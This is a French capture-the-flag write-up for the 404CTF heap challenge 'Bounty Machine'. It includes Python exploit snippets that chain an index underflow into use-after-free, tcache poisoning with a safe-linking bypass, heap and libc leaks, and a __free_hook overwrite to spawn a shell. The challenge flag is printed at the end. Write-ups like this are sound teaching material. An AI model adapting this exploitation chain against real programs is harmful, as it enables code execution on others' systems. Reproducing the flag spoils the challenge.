# Writeup pour `Bounty Machine`

Auteur : *Pwnsard*  
Difficulté : *Moyen*

### Notions principales :
- Use after free
- Tcache poisoning
- Safe linking

### Protections :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   89 Symbols	  No	0		3		data/chall
```

On utilise une libc 2.32, donc il faut également éviter le safe linking...

### Principe

Il s'agit d'un chall de heap assez classique. La faille réside dans le fait que la fonction edit_bounty
```C
edit_bounty(uint8_t i)
```
prend en paramètre un uint8, alors qu'on lui passe un int en argument ici :
```C
res = scanf("%d", &idx);
if (idx < nbounties) {
    edit_bounty(idx);
} else {
    puts("This bounty doesn't exist");
}
```
On peut donc exploiter un use after free grâce à un underflow/overflow sur idx pour faire un tcache poisoning : accéder au bounty -256 est comme accéder au bounty 0.

Pour éviter le safe linking de la libc 2.32, on leak d'abord l'adresse de la heap grâce à un premier chunk.

```python
# Leaking the heap base address
print("[*] Leaking heap address")
add_bounty(100, b"HRTC", b"C" * 0x40)
add_bounty(100, b"HRTC", b"D" * 0x40)
free_bounty()
leak = edit_bounty(-255)
amount_leak = int(leak.split(b" ")[11])
leak_pos = u64(leak.split(b'\n')[2] +  b"\x00\x00\x00")
heap_addr = leak_pos << 12
print(f"heap@{hex(heap_addr)}")
apply_edit(amount_leak, p64(leak_pos) + b"E" * 0x38)
free_bounty()
```

Maintenant on récupère un arbitrary read/write. On peut avoir une adresse de la libc dans la heap avec la méthode classique d'allouer un chunk de grande taille (ici 0x4b0) avec malloc. Par contre cette adresse de la libc se finissant par un nullbyte, on ne peut pas la lire directement en créant un faux chunk. On falsifie donc la liste des bounty pour que le pointeur `bounties[0]->name` pointe juste après le null byte (d'où le +1 dans `libc_addr = heap_addr + 0x400 + 1`)

```python
# Putting a libc pointer somewhere on the stack
print("[*] Setting up a libc leak")
add_bounty(100, b"HRTC", b"A" * 0x4b0)
add_bounty(100, b"HRTC", b"B" * 0x4b0)
free_bounty()
free_bounty()

...

# Now creating a fake chunk to leak libc
print("[*] Leaking libc")
bounties_array_addr = heap_addr + 0x2a0
libc_addr = heap_addr + 0x400 + 1
print(f"bounties_array@{hex(bounties_array_addr)}")
print(f"libc_leak@{hex(libc_addr)}")
print(f"libc_leak@{hex(bounties_array_addr ^ leak_pos)}")
add_bounty(100, b"HRTC", b"F" * 0x30)
add_bounty(100, b"HRTC", b"G" * 0x30)
free_bounty()
free_bounty()
leak =  edit_bounty(-256)
amount_leak = int(leak.split(b" ")[11])
apply_edit(amount_leak, p64((bounties_array_addr - 0x20) ^ leak_pos) + b"H" * 0x28)
```

Une fois l'adresse de la libc connue, on réutilise un dernier tcache poisoning pour réécrire l'adresse de `__malloc_free_hook` par celle de `system`. Maintenant lorsque l'on appelle free, on appelle également system.

```C
add_bounty(100, b"HRTC", b"N" * 0x60 + p64(libc.symbols["system"]))

add_bounty(100, b"/bin/sh\x00", b"O" * 0x70)
```

Il ne reste plus qu'à "Claim the latest bounty" en entrant 4, pour être récompensé avec `Congratulations for your catch of /bin/sh !` et obtenir un shell.

Pour résumer :   
underflow > use after free > leak heap et safe linking bypass > tcache poisoning > leak libc > réécriture de __malloc_free_hook > free /bin/sh

Et on obtient un shell !

### Script de résolution :

Voir `solve.py`

### Flag : 

`404CTF{yOU're_G0nnA_CARry_THa7_weIGH7}`